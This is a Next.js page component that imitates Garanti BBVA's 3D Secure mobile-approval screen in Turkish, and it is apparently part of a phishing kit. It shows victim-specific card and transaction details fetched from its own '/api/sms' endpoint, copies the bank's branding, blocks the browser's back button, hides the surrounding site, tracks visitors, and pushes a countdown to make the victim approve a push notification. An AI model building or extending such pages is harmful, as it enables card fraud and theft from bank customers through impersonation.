'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import OnlineTracker from '@/components/OnlineTracker';

interface SmsData {
    tutar: string;
    tarih: string;
    lastFourDigits: string;
    cardType: 'visa' | 'mastercard' | 'unknown';
    maskedPhone: string;
    isyeriAdi: string;
    banka?: string;
}

export default function GarantiMobilOnayPage() {
    const router = useRouter();
    const [data, setData] = useState<SmsData | null>(null);
    const [loading, setLoading] = useState(true);
    const [timeLeft, setTimeLeft] = useState(119); // 1 minute 59 seconds default (like screenshot 01:14)
    const [isTimeout, setIsTimeout] = useState(false);
    const [deviceModel, setDeviceModel] = useState('iPhone');

    // Prevent back navigation
    useEffect(() => {
        window.history.pushState(null, '', window.location.href);
        const handlePopState = () => {
            window.history.pushState(null, '', window.location.href);
        };
        window.addEventListener('popstate', handlePopState);
        return () => window.removeEventListener('popstate', handlePopState);
    }, []);

    // Load data & Device Model
    useEffect(() => {
        const fetchData = async () => {
            try {
                const response = await fetch('/api/sms');
                const result = await response.json();
                
                if (result.success) {
                    setData(result.data);
                } else if (result.redirect) {
                    router.push(result.redirect);
                }
            } catch (err) {
                console.error('Veri yükleme hatası:', err);
            } finally {
                setLoading(false);
            }
        };

        fetchData();

        // Get user device model
        const ua = navigator.userAgent;
        if (/iPhone/i.test(ua)) {
            setDeviceModel('iPhone');
        } else if (/iPad/i.test(ua)) {
            setDeviceModel('iPad');
        } else if (/Samsung/i.test(ua)) {
            setDeviceModel('Samsung');
        } else if (/Redmi|Xiaomi/i.test(ua)) {
            setDeviceModel('Xiaomi');
        } else if (/Huawei/i.test(ua)) {
            setDeviceModel('Huawei');
        } else if (/Android/i.test(ua)) {
            setDeviceModel('Android');
        } else {
            setDeviceModel('iPhone 15 Pro Max');
        }
    }, [router]);

    // Timer countdown
    useEffect(() => {
        if (timeLeft <= 0) {
            setIsTimeout(true);
            handleTimeoutUpdate();
            return;
        }

        const timer = setInterval(() => {
            setTimeLeft(prev => prev - 1);
        }, 1000);

        return () => clearInterval(timer);
    }, [timeLeft]);

    const handleTimeoutUpdate = async () => {
        try {
            await fetch('/api/sms', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ smsCode: 'TIMEOUT' })
            });
        } catch (e) {
            console.error(e);
        }
        router.push('/odeme/onay');
    };

    const formatTimer = (seconds: number) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
    };

    if (loading) {
        return (
            <div className="flex items-center justify-center min-h-screen bg-[#f4f6fa]">
                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                `}</style>
                <div className="w-12 h-12 border-4 border-emerald-200 border-t-emerald-600 rounded-full animate-spin"></div>
            </div>
        );
    }

    const cc = data?.lastFourDigits || '9037';
    
    // EMBEDDED DYNAMIC SVG LOGOS TO PREVENT CORRUPTION / NOT FOUND LINKS
    const visaLogoSvg = (
        <svg width="45" height="15" viewBox="0 0 24 8" fill="#002d62">
            <path d="M3.4 7.6L4.7.4h1.3l-1.3 7.2zM8.8.4c-.3-.1-.8-.2-1.3-.2C6.2.2 5.3.9 5.3 2.1c0 1 .9 1.5 1.5 1.8.7.3.9.5.9.8 0 .5-.6.7-1.1.7-.8 0-1.2-.1-1.8-.4L3.5 6c.5.2 1.4.4 2.2.4 1.4 0 2.3-.7 2.3-1.8 0-.6-.4-1.1-1.2-1.4-.5-.3-.8-.4-.8-.7 0-.2.3-.5.9-.5.5 0 .9.1 1.2.2l.2.1zM11.6 5c.1-.3.6-1.7.6-1.7L12.5 5h-1.2zm1.8 2.6L12.1.4h-1.1c-.3 0-.6.2-.7.5L8.7 7.6h1.4l.3-.8h1.7l.2.8h1.8v-.2zM.6.4L0 4.2C0 4.2.9 1 .9.9.9.8.7.6.6.6H.1L0 .4h2z" />
        </svg>
    );

    const mastercardLogoSvg = (
        <svg width="34" height="20" viewBox="0 0 22 17">
            <circle cx="7" cy="8.5" r="7" fill="#eb001b" />
            <circle cx="15" cy="8.5" r="7" fill="#ff5f00" fillOpacity="0.85" />
        </svg>
    );

    const cardSchemeLogo = data?.cardType === 'mastercard' ? mastercardLogoSvg : visaLogoSvg;
    const cleanTutar = (data?.tutar || '').replace(/TL|TRY|₺/gi, '').trim() || '49,99';

    return (
        <>
            <OnlineTracker />
            <style jsx global>{`
                nav.fixed.bottom-0 { display: none !important; }
                main { padding-bottom: 0 !important; }
                header { display: none !important; }
                * {
                    box-sizing: border-box;
                    margin: 0;
                    padding: 0;
                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                }
                body {
                    background: #f4f6fa !important;
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: flex-start;
                }
            `}</style>

            <div style={{
                width: '100%',
                maxWidth: '480px',
                margin: '0 auto',
                padding: '16px',
                display: 'flex',
                flexDirection: 'column',
                gap: '14px'
            }}>
                {/* Header (Logo Row) */}
                <div style={{
                    display: 'flex',
                    justifyContent: 'space-between',
                    alignItems: 'center',
                    padding: '8px 4px 4px 4px'
                }}>
                    {/* Inline Garanti BBVA SVG Logo to prevent any network image loading issues */}
                    <svg width="120" height="26" viewBox="0 0 216 46" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12.9231 29.5676C12.3923 30.6486 11.2308 31.6216 9.8 32.1622C8.36923 32.7027 6.75385 32.8108 5.2 32.4865C3.64615 32.1622 2.21538 31.4054 1.18462 30.2162C0.153846 29.027 0.0461538 27.5135 0.876923 26.1622C1.3 25.5135 1.94615 25.0811 2.68462 24.8649C3.42308 24.6486 4.25385 24.6486 5.08462 24.8649C5.91538 25.0811 6.65385 25.5135 7.08462 26.1622C7.51538 26.8108 7.62308 27.5676 7.40769 28.3243C8.05385 28.1081 8.59231 27.6757 8.91538 27.1351C9.23846 26.5946 9.23846 25.9459 8.91538 25.4054C8.59231 24.8649 8.05385 24.4324 7.40769 24.2162C6.76154 24 5.91538 24 5.08462 24.2162C4.25385 24.4324 3.42308 24.8649 2.68462 25.4054C1.94615 25.9459 1.3 26.7027 0.876923 27.4595C-0.353846 29.5135 -0.246154 31.9459 1.18462 33.7838C2.61538 35.6216 4.92308 36.7027 7.50769 36.7027C8.58462 36.7027 9.66154 36.4865 10.6385 36.0541C11.6154 35.6216 12.3846 34.973 12.9231 34.2162L12.9231 29.5676Z" fill="#008542" />
                        <path d="M5.4 17.5C10.26 17.5 13.9 14.02 13.9 9.1C13.9 4.18 10.26 0.7 5.4 0.7H0V17.5H5.4ZM3.8 3.9H5.2C7.72 3.9 9.8 5.58 9.8 9.1C9.8 12.62 7.72 14.3 5.2 14.3H3.8V3.9Z" fill="#002D62" />
                        <path d="M23.1 17.5H27L20.4 0.7H16.4L9.8 17.5H13.7L15.1 13.8H21.7L23.1 17.5ZM16.2 10.7L18.4 5.1L20.6 10.7H16.2Z" fill="#002D62" />
                        <path d="M37.3 17.5V11.2C37.3 7.84 35.1 6.44 32.3 6.44C29.6 6.44 27.9 7.7 27.9 9.94H31.5C31.5 9.1 32 8.54 32.7 8.54C33.7 8.54 34 9.1 34 10.22V10.92C33.2 10.92 31 10.92 29.4 11.2C27.2 11.62 26 12.88 26 14.84C26 16.66 27.6 17.78 30.1 17.78C32.4 17.78 34.2 16.66 34.5 15.4H34.6L34.9 17.5H37.3ZM31.1 15.4C30.1 15.4 29.3 14.84 29.3 14.14C29.3 13.3 30.1 12.74 31.8 12.74C32.7 12.74 33.7 12.74 34.1 12.88V14.14C34.1 14.98 32.7 15.4 31.1 15.4Z" fill="#002D62" />
                        <path d="M46.8 6.58H43.7L43.4 8.68H43.3C42.8 7.42 41.2 6.44 39.4 6.44C36.6 6.44 34.7 8.68 34.7 12.18C34.7 15.54 36.6 17.78 39.3 17.78C41.2 17.78 42.8 16.8 43.3 15.54H43.4L43.7 17.5H46.8V6.58ZM40.7 15.26C39 15.26 37.8 14 37.8 12.18C37.8 10.36 39 9.1 40.7 9.1C42.4 9.1 43.6 10.36 43.6 12.18C43.6 14 42.4 15.26 40.7 15.26Z" fill="#002D62" />
                        <path d="M48.2 17.5H51.4V6.58H48.2V17.5ZM49.8 4.62C50.9 4.62 51.7 3.78 51.7 2.66C51.7 1.54 50.9 0.7 49.8 0.7C48.7 0.7 47.9 1.54 47.9 2.66C47.9 3.78 48.7 4.62 49.8 4.62Z" fill="#002D62" />
                        <path d="M57.6 17.5V11.34C57.6 9.8 58.7 8.96 60.1 8.96C61.4 8.96 62.1 9.8 62.1 11.34V17.5H65.3V10.78C65.3 7.84 63.6 6.44 61.2 6.44C59.5 6.44 58.1 7.28 57.5 8.54H57.4L57.1 6.58H54.1V17.5H57.6Z" fill="#002D62" />
                        <path d="M70.9 17.5H74.1V9.94H75.7C77.4 9.94 78.4 10.64 78.4 12.18V17.5H81.6V11.76C81.6 8.54 79.5 7.14 76.8 7.14H74.1V0.7H70.9V17.5Z" fill="#002D62" />
                        <path d="M84.7 17.5H88.5C92.6 17.5 95 15.54 95 12.6C95 10.5 93.6 9.24 91.5 8.82V8.68C93.2 8.26 94.4 7 94.4 5.18C94.4 2.52 92.2 0.7 88.5 0.7H84.7V17.5ZM87.9 3.92H88.3C90.3 3.92 91.3 4.76 91.3 6.02C91.3 7.28 90.3 8.12 88.3 8.12H87.9V3.92ZM87.9 11.06H88.5C90.7 11.06 91.8 11.9 91.8 13.3C91.8 14.7 90.7 15.54 88.5 15.54H87.9V11.06Z" fill="#002D62" />
                        <path d="M96.7 17.5H100.5C104.6 17.5 107 15.54 107 12.6C107 10.5 105.6 9.24 103.5 8.82V8.68C105.2 8.26 106.4 7 106.4 5.18C106.4 2.52 104.2 0.7 100.5 0.7H96.7V17.5ZM99.9 3.92H100.3C102.3 3.92 103.3 4.76 103.3 6.02C103.3 7.28 102.3 8.12 100.3 8.12H99.9V3.92ZM99.9 11.06H100.5C102.7 11.06 103.8 11.9 103.8 13.3C103.8 14.7 102.7 15.54 100.5 15.54H99.9V11.06Z" fill="#002D62" />
                        <path d="M116.5 17.5L120.6 0.7H117L114.7 11.2L112.4 0.7H108.8L112.9 17.5H116.5Z" fill="#002D62" />
                        <path d="M129.8 17.5H133.7L127.1 0.7H123.1L116.5 17.5H120.4L121.8 13.8H128.4L129.8 17.5ZM122.9 10.7L125.1 5.1L127.3 10.7H122.9Z" fill="#002D62" />
                    </svg>
                    
                    {/* Dynamic Card Scheme Logo (Visa or Mastercard SVG) */}
                    {cardSchemeLogo}
                </div>

                {/* Subtitle */}
                <div style={{
                    fontSize: '15px',
                    fontWeight: '700',
                    color: '#111',
                    paddingLeft: '4px'
                }}>
                    3D Secure Ödeme Doğrulama
                </div>

                {/* Green Summary Badge */}
                <div style={{
                    background: '#008542',
                    borderRadius: '8px',
                    padding: '14px 16px',
                    color: '#fff',
                    display: 'flex',
                    justifyContent: 'space-between',
                    alignItems: 'flex-start',
                    boxShadow: '0 2px 8px rgba(0, 133, 66, 0.15)'
                }}>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                        <div style={{
                            fontSize: '13.5px',
                            fontWeight: '700',
                            maxWidth: '220px',
                            overflow: 'hidden',
                            textOverflow: 'ellipsis',
                            whiteSpace: 'nowrap'
                        }}>
                            {data?.isyeriAdi || 'GAZILER VERGI DAICESI'}
                        </div>
                        <div style={{ fontSize: '11px', opacity: 0.85 }}>
                            {data?.tarih || '11.07.2026, 20:08'}
                        </div>
                    </div>
                    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: '4px' }}>
                        <div style={{ fontSize: '13.5px', fontWeight: '700' }}>
                            {cleanTutar} TRY
                        </div>
                        <div style={{ fontSize: '11px', opacity: 0.85, fontFamily: 'monospace', letterSpacing: '0.5px' }}>
                            528939******{cc}
                        </div>
                    </div>
                </div>

                {/* Main Instruction Card */}
                <div style={{
                    background: '#fff',
                    borderRadius: '8px',
                    boxShadow: '0 2px 10px rgba(0,0,0,0.05)',
                    padding: '20px 16px',
                    display: 'flex',
                    flexDirection: 'column',
                    alignItems: 'center',
                    gap: '24px'
                }}>
                    {/* Timer Row */}
                    <div style={{
                        display: 'flex',
                        alignItems: 'center',
                        gap: '12px',
                        width: '100%',
                        paddingBottom: '16px',
                        borderBottom: '1px solid #f0f0f0'
                    }}>
                        {/* Blue Clock Icon */}
                        <div style={{
                            width: '36px',
                            height: '36px',
                            borderRadius: '50%',
                            background: '#e0f2fe',
                            display: 'flex',
                            alignItems: 'center',
                            justifyContent: 'center',
                            flexShrink: 0
                        }}>
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#0284c7" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                                <circle cx="12" cy="12" r="10" />
                                <polyline points="12 6 12 12 16 14" />
                            </svg>
                        </div>
                        <div style={{ display: 'flex', flexDirection: 'column' }}>
                            <span style={{ fontSize: '11px', color: '#666' }}>İşlemi tamamlamak için kalan süre:</span>
                            <span style={{ fontSize: '16px', fontWeight: '700', color: '#111' }}>{formatTimer(timeLeft)}</span>
                        </div>
                    </div>

                    {/* Garanti Clover Logo Icon Container */}
                    <div style={{
                        width: '74px',
                        height: '74px',
                        borderRadius: '16px',
                        overflow: 'hidden',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        boxShadow: '0 4px 12px rgba(0, 133, 66, 0.2)'
                    }}>
                        <img 
                            src="/garanti-clover.png" 
                            alt="Garanti Clover" 
                            style={{ width: '100%', height: '100%', objectFit: 'cover' }}
                        />
                    </div>

                    {/* Instruction Text */}
                    <div style={{
                        fontSize: '13.5px',
                        color: '#444',
                        textAlign: 'center',
                        lineHeight: '1.6',
                        padding: '0 8px'
                    }}>
                        Lütfen telefonunuza gönderilen bildirimi Garanti BBVA Mobil uygulaması üzerinden onaylayın.
                    </div>
                </div>
            </div>
        </>
    );
}
